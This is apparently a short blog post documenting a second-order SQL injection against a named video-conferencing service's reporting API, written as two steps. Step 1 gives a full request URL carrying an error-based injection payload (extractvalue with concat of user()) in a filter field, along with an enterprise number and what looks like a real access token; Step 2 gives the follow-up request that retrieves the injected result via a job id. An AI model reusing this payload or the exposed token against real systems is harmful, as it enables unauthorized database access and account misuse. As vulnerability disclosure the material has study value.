---
layout: post
title: BlueJeans Second Order Sql Injection
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - saltedfish</p>

## Step 1:

<img src="https://i.loli.net/2019/03/06/5c7f7c6a83dbc.jpeg">

{% highlight php %}
https://indigo-api.bluejeans.com/v1/enterprise/158555/indigo/reportJob/meetings?filter=[{"type":"date","comparison":"gt","value":"2018-11-06T00:00:00+08:00","field":"start_time%20>'2018-11-06T00:00:00+08:00'+and(extractvalue(1,concat(0x2c,user())))%23"},{"type":"date","comparison":"lt","value":"2019-01-09T23:59:59+08:00","field":"end_time"}]&fileName=meetings_6th-Nov-2018_9th-Jan-2019&userid=2782750&filter=%255B%257B%2522type%2522%253A%2522date%2522%252C%2522comparison%2522%253A%2522gt%2522%252C%2522value%2522%253A%25222018-11-06T00%253A00%253A00%252B08%253A00%2522%252C%2522field%2522%253A%2522start_time%2522%257D%252C%257B%2522type%2522%253A%2522date%2522%252C%2522comparison%2522%253A%2522lt%2522%252C%2522value%2522%253A%25222019-01-09T23%253A59%253A59%252B08%253A00%2522%252C%2522field%2522%253A%2522end_time%2522%257D%255D&access_token=3cfd90abe2fa44c1b1d68555c6c01416&app_name=command_center
{% endhighlight %}

(or you just use your enterprise number and your accesstoken,you can get this when you login in)

<img src="https://i.loli.net/2019/03/06/5c7f7c6ab7a24.jpeg">

&nbsp;&nbsp;&nbsp;Now, you will get a jobid like `5c7e04884f0cb3fb45043ab9`

## Step 2:

{% highlight php %}
https://indigo-api.bluejeans.com/v1/enterprise/158555/indigo/jobStatus/`5c7e04884f0cb3fb45043ab9`?filter=&access_token=3cfd90abe2fa44c1b1d68555c6c01416&_=1551762518572&app_name=command_center
{% endhighlight %}

<img src="https://i.loli.net/2019/03/06/5c7f7c6ad61df.jpeg">